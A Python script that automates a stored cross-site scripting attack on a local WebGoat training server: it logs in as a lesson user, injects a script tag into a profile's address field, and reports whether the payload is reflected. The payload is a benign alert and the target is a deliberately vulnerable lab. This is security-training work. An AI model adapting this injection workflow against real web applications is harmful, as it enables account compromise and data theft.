import argparse
import re
import json
import sys
import threading
import requests
import random


def xss_test():
   # ENTER PHASE
   # obtain session to webgoat page
   s = requests.Session()

   # login to webgoat session
   logon_url = "http://127.0.0.1:8080/WebGoat/login.mvc"
   logon_data = { 'username' : 'guest' , 'password' : 'guest'}

   r = s.get(logon_url)
   cookie = r.cookies
   r_auth = s.post('http://127.0.0.1:8080/WebGoat/j_spring_security_check;jessionid=' + str(cookie['JSESSIONID']), data = logon_data)

   # obtain screen & menu number via JSON 
   screen = s.get('http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc')

   screen_string = json.loads(screen.text)
   menu_screen_str = screen_string[8]["children"][1]["children"][0]["link"]

   # set attack page
   attack_page_url = 'http://127.0.0.1:8080/WebGoat/' + menu_screen_str
   attack_page = s.get(attack_page_url) 


   # ATTACK PHASE
   # login as Tom
   profile_logon_tom = {'employee_id' : '105' , 'password' : 'tom' , 'action' : 'Login' }
   tom_auth = s.post(attack_page_url, data = profile_logon_tom)

   # view Tom profile
   view_profile = {'employee_id' : '105' ,  'action' : 'ViewProfile'}
   select_profile = s.post(attack_page_url, data = view_profile)

   # edit Tom Profile
   select_edit = {'employee_id' : '105' , 'action' : 'EditProfile'}
   tom_edit = s.post(attack_page_url,data = select_edit)
   profile_edit = {'firstName': 'Tom' , 'lastName' : 'Cat' , 'address1' : '2211+HyperThread+Rd.%3Cscript%3Ealert(\'You+Shall+Not+Pass\')%3B%3C%2Fscript%3E' , 'address2' : 'New+York%2C+NY' , 'phoneNumber' : '443-599-0762' , 'startDate' : '1011999' , 'ssn' :'792-14-6364' , 'salary' : '80000' , 'ccn' : '5481360857968521' , 'ccnLimit' : '30000' , 'description' : 'Co-Owner.' , 'manager' : '105' , 'disciplinaryNotes' : 'NA' , 'disciplinaryDate' : '0' , 'employee_id' : '105' , 'title' : 'Engineer' , 'action' : 'UpdateProfile'}
   tom_edit = s.post(attack_page_url, data = profile_edit)

   # get results
   result_string = tom_edit.text
   result_string = result_string.split('%3Cscript%3E')
   result_string = result_string[1].split('%3B%3C%2Fscript%3E')
   final_result = result_string[0]
   
   # check results
   if final_result:
     print "XSS Present"
   else:
     print "No XSS Present"



xss_test()
   
   

